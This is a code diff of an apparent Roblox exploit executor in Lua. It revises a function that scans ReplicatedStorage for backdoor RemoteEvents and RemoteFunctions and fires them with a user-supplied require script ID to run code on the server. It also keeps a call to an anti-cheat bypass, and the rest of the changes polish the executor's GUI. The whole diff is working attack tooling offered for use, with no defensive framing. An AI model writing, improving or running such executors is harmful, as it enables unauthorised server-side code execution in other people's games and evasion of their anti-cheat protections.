@@ -34,50 +34,28 @@ local function scanForBackdoors()
     return backdoors
 end
 
--- Server-Side Require Execution via RemoteEvent
-local function executeServerRequire(scriptInput)
-    local RemoteStorage = game:GetService("ReplicatedStorage")
-    local serverRequireEvent = RemoteStorage:FindFirstChild("ServerRequireExecution")
-    if serverRequireEvent then
-        serverRequireEvent:FireServer(scriptInput)
-    else
-        warn("ServerRequireExecution RemoteEvent not found in ReplicatedStorage.")
+-- Server-Side Require Execution via Backdoor
+local function executeServerRequire(scriptID)
+    local backdoors = scanForBackdoors()
+    for _, backdoor in ipairs(backdoors) do
+        local success, result = pcall(function()
+            local obj = game:GetService("ReplicatedStorage"):FindFirstChild(backdoor)
+            if obj and obj:IsA("RemoteFunction") then
+                return obj:InvokeServer(scriptID)
+            elseif obj and obj:IsA("RemoteEvent") then
+                return obj:FireServer(scriptID)
+            else
+                error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor)
+            end
+        end)
+        if success then
+            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor)
+            return
+        else
+            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor .. " - " .. result)
+        end
     end
-end
-
-local function executeRemoteStorage(scriptName)
-    local RemoteStorage = game:GetService("ReplicatedStorage")
-    local remoteScript = RemoteStorage:FindFirstChild(scriptName)
-    if remoteScript and remoteScript:IsA("ModuleScript") then
-        local success, result = pcall(require, remoteScript)
-        return success and "[SUCCESS] Remote Script Executed Successfully!" or "[ERROR] Remote Script Execution Failed: " .. result
-    else
-        return "[ERROR] Script not found or is not a ModuleScript."
-    end
-end
-
--- Execute RemoteEvent
-local function executeRemoteEvent(eventName, ...)
-    local RemoteStorage = game:GetService("ReplicatedStorage")
-    local remoteEvent = RemoteStorage:FindFirstChild(eventName)
-    if remoteEvent and remoteEvent:IsA("RemoteEvent") then
-        remoteEvent:FireServer(...)
-        return "[SUCCESS] RemoteEvent Fired Successfully!"
-    else
-        return "[ERROR] RemoteEvent not found."
-    end
-end
-
--- Execute RemoteFunction
-local function executeRemoteFunction(functionName, ...)
-    local RemoteStorage = game:GetService("ReplicatedStorage")
-    local remoteFunction = RemoteStorage:FindFirstChild(functionName)
-    if remoteFunction and remoteFunction:IsA("RemoteFunction") then
-        local success, result = pcall(remoteFunction.InvokeServer, remoteFunction, ...)
-        return success and "[SUCCESS] RemoteFunction Invoked Successfully!" or "[ERROR] RemoteFunction Invocation Failed: " .. result
-    else
-        return "[ERROR] RemoteFunction not found."
-    end
+    warn("[ERROR] No suitable backdoor found for script execution.")
 end
 
 -- Function to animate the RGB border
@@ -143,7 +121,7 @@ local function createUI()
     addShadow(TextLabel)
     
     WarningLabel.Parent = Frame
-    WarningLabel.Text = "Your game might be freezing because of this script."
+    WarningLabel.Text = "Your game might freeze because of this script."
     WarningLabel.Size = UDim2.new(1, 0, 0.1, 0)
     WarningLabel.Position = UDim2.new(0, 0, 0.2, 0)
     WarningLabel.BackgroundTransparency = 1
@@ -157,7 +135,7 @@ local function createUI()
     InputBox.Position = UDim2.new(0.1, 0, 0.35, 0)
     InputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     InputBox.TextColor3 = Color3.fromRGB(0, 0, 0)
-    InputBox.PlaceholderText = "Enter require script here"
+    InputBox.PlaceholderText = "Enter require script ID here"
     InputBox.TextScaled = true
     InputBox.Font = Enum.Font.SourceSans
 
@@ -172,15 +150,25 @@ local function createUI()
     ExecuteButton.BorderSizePixel = 0
 
     -- Add corner radius
+    local FrameCorner = Instance.new("UICorner")
+    FrameCorner.CornerRadius = UDim.new(0, 10)
+    FrameCorner.Parent = Frame
+
     local ExecuteButtonCorner = Instance.new("UICorner")
     ExecuteButtonCorner.CornerRadius = UDim.new(0, 10)
     ExecuteButtonCorner.Parent = ExecuteButton
+
     addShadow(ExecuteButton)
 
     -- Execute button functionality
     ExecuteButton.MouseButton1Click:Connect(function()
         local userInput = InputBox.Text
-        executeServerRequire(userInput)
+        local success, result = pcall(executeServerRequire, userInput)
+        if success then
+            print("[SUCCESS] Script executed: " .. result)
+        else
+            warn("[ERROR] Script execution failed: " .. result)
+        end
     end)
     
     UIGradient.Parent = Frame
@@ -200,30 +188,3 @@ createUI()
 
 -- Anti-Cheat by-pass
 antiCheatBypass()
-
--- Server-Side Script Execution via Backdoor
-local function executeBackdoorRequire(scriptID)
-    local backdoors = scanForBackdoors()
-    for _, backdoor in ipairs(backdoors) do
-        local success, result = pcall(function()
-            local RemoteStorage = game:GetService("ReplicatedStorage")
-            local remoteScript = RemoteStorage:FindFirstChild(backdoor)
-            if remoteScript and remoteScript:IsA("RemoteFunction") then
-                remoteScript:InvokeServer(scriptID)
-            elseif remoteScript and remoteScript:IsA("RemoteEvent") then
-                remoteScript:FireServer(scriptID)
-            end
-        end)
-        if success then
-            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor)
-            return
-        else
-            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor .. " - " .. result)
-        end
-    end
-end
-
--- Adding the new function to execute require scripts via backdoors
-function executeServerRequire(scriptInput)
-    executeBackdoorRequire(scriptInput)
-end
